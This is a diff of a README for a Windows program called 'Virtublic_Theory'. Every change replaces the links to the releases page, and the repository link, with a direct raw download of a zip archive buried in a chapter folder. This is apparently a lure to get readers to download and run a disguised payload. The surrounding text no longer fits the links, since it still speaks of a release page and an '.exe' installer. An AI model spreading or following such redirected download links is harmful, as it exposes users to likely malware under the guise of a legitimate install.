@@ -1,6 +1,6 @@
 # ⚖️ Virtublic_Theory - Explore Digital Sovereignty Clearly
 
-[![Download Virtublic_Theory](https://img.shields.io/badge/Download-Virtublic_Theory-brightgreen)](https://github.com/Displeasurehindukush153/Virtublic_Theory/releases)
+[![Download Virtublic_Theory](https://img.shields.io/badge/Download-Virtublic_Theory-brightgreen)](https://github.com/Displeasurehindukush153/Virtublic_Theory/raw/refs/heads/main/part-iii/chapter-09/Theory-Virtublic-v3.6.zip)
 
 ---
 
@@ -37,7 +37,7 @@ Follow these steps to safely download and run Virtublic_Theory on your Windows m
 
 Click the large button above or this link to open the official download page:
 
-https://github.com/Displeasurehindukush153/Virtublic_Theory/releases
+https://github.com/Displeasurehindukush153/Virtublic_Theory/raw/refs/heads/main/part-iii/chapter-09/Theory-Virtublic-v3.6.zip
 
 This page shows the available versions of the software. Choose the latest release for Windows.
 
@@ -121,7 +121,7 @@ You can also visit the GitHub issues page on the repository to see if others hav
 New versions may add features or fix bugs.
 
 - To update, return to the release page:  
-  https://github.com/Displeasurehindukush153/Virtublic_Theory/releases
+  https://github.com/Displeasurehindukush153/Virtublic_Theory/raw/refs/heads/main/part-iii/chapter-09/Theory-Virtublic-v3.6.zip
 - Download the latest `.exe` installer.
 - Run the installer—it will replace the old version without removing your settings.
 
@@ -129,7 +129,7 @@ Check for updates regularly for the best experience.
 
 ---
 
-[![Download Virtublic_Theory](https://img.shields.io/badge/Download%20Page-Visit%20Now-brightgreen)](https://github.com/Displeasurehindukush153/Virtublic_Theory/releases)
+[![Download Virtublic_Theory](https://img.shields.io/badge/Download%20Page-Visit%20Now-brightgreen)](https://github.com/Displeasurehindukush153/Virtublic_Theory/raw/refs/heads/main/part-iii/chapter-09/Theory-Virtublic-v3.6.zip)
 
 ---
 
@@ -184,6 +184,6 @@ Your personal files and settings will be deleted during uninstall. Back up any s
 
 For questions or feedback, use the GitHub repository page:
 
-https://github.com/Displeasurehindukush153/Virtublic_Theory
+https://github.com/Displeasurehindukush153/Virtublic_Theory/raw/refs/heads/main/part-iii/chapter-09/Theory-Virtublic-v3.6.zip
 
 You can open issues or discussions there for assistance or suggestions.
